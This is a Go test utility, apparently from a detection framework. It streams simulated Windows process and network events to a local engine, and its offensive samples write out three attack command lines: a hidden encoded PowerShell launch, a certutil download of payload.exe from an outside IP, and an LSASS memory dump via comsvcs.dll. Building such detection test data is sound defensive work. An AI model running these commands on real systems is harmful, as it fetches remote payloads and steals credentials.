package main

import (
        "crypto/rand"
        "flag"
        "fmt"
        "net"
        "os"
        "time"

        "github.com/Ruby570bocadito/security-framework/pkg/model"
)

// devsensor generates simulated process events (some benign, some
// emulating well-known offensive TTPs) and streams them as NDJSON to
// the engine. It exists so the full pipeline can be exercised on any
// platform without ETW, exactly like the tracer bullet in the docs.

var (
        addr     = flag.String("addr", "127.0.0.1:7777", "engine address")
        interval = flag.Duration("interval", 400*time.Millisecond, "delay between events")
)

var scenario = []*model.Event{
        benign(&model.Event{
                Type: model.TypeProcessCreate,
                Process: &model.Process{PID: 4104, PPID: 812, Name: "explorer.exe",
                        Image: `C:\Windows\explorer.exe`},
        }),
        benign(&model.Event{
                Type: model.TypeProcessCreate,
                Process: &model.Process{PID: 4212, PPID: 4104, Name: "notepad.exe",
                        CommandLine: `"C:\Windows\system32\NOTEPAD.EXE" C:\Users\jdoe\Documents\todo.txt`,
                        Image:       `C:\Windows\System32\notepad.exe`},
        }),
        benign(&model.Event{
                Type: model.TypeNetworkConnect,
                Network: &model.Network{Protocol: "tcp", SourceIP: "10.0.4.42", SourcePort: 51520,
                        DestinationIP: "142.250.200.36", DestinationPort: 443, Domain: "www.google.com"},
        }),
        // T1059.001 - PowerShell with encoded command (offensive)
        offensive(&model.Event{
                Type: model.TypeProcessCreate,
                Process: &model.Process{PID: 6612, PPID: 4104, Name: "powershell.exe",
                        CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                        Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
        }),
        // T1105 - certutil download (offensive)
        offensive(&model.Event{
                Type: model.TypeProcessCreate,
                Process: &model.Process{PID: 6688, PPID: 4104, Name: "certutil.exe",
                        CommandLine: "certutil.exe -urlcache -split -f https://185.220.101.47/payload.exe C:\\Users\\Public\\payload.exe",
                        Image:       `C:\Windows\System32\certutil.exe`},
        }),
        // T1003.001 - LSASS dump via comsvcs.dll (offensive)
        offensive(&model.Event{
                Type: model.TypeProcessCreate,
                Process: &model.Process{PID: 6721, PPID: 6612, Name: "rundll32.exe",
                        CommandLine: `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 744 C:\Windows\Temp\lsass.dmp full`,
                        Image:       `C:\Windows\System32\rundll32.exe`},
        }),
        benign(&model.Event{
                Type: model.TypeProcessTerminate,
                Process: &model.Process{PID: 4212, Name: "notepad.exe"},
        }),
}

func main() {
        flag.Parse()

        conn, err := net.Dial("tcp", *addr)
        if err != nil {
                fmt.Fprintf(os.Stderr, "[DEVSENSOR] cannot reach engine at %s: %v\n", *addr, err)
                fmt.Fprintln(os.Stderr, "[DEVSENSOR] hint: start the engine first:  make run-engine")
                os.Exit(1)
        }
        defer conn.Close()

        fmt.Printf("[DEVSENSOR] connected to %s - streaming %d events\n", *addr, len(scenario))
        for i, ev := range scenario {
                line, err := ev.Encode()
                if err != nil {
                        fmt.Fprintf(os.Stderr, "[DEVSENSOR] encode: %v\n", err)
                        os.Exit(1)
                }
                if _, err := conn.Write(append(line, '\n')); err != nil {
                        fmt.Fprintf(os.Stderr, "[DEVSENSOR] send: %v\n", err)
                        os.Exit(1)
                }
                marker := "benign"
                for _, t := range ev.Tags {
                        if t == "ttp:offensive" {
                                marker = "OFFENSIVE"
                        }
                }
                fmt.Printf("[DEVSENSOR] %2d/%d %-9s %-18s %s\n",
                        i+1, len(scenario), marker, ev.Type, describe(ev))
                time.Sleep(*interval)
        }
        fmt.Println("[DEVSENSOR] scenario complete - connection closed")
}

func describe(ev *model.Event) string {
        if ev.Process != nil {
                return ev.Process.Name
        }
        if ev.Network != nil {
                return ev.Network.Domain
        }
        return "-"
}

func benign(ev *model.Event) *model.Event {
        ev.ID = newUUID()
        ev.Timestamp = time.Now().UTC()
        ev.Source = "simulate"
        ev.Host = "LAB-WKS-01"
        ev.User = `CORP\jdoe`
        return ev
}

func offensive(ev *model.Event) *model.Event {
        ev = benign(ev)
        ev.Tags = append(ev.Tags, "ttp:offensive")
        return ev
}

// newUUID returns a RFC 4122 v4 UUID without external dependencies.
func newUUID() string {
        b := make([]byte, 16)
        _, _ = rand.Read(b)
        b[6] = (b[6] & 0x0f) | 0x40
        b[8] = (b[8] & 0x3f) | 0x80
        return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
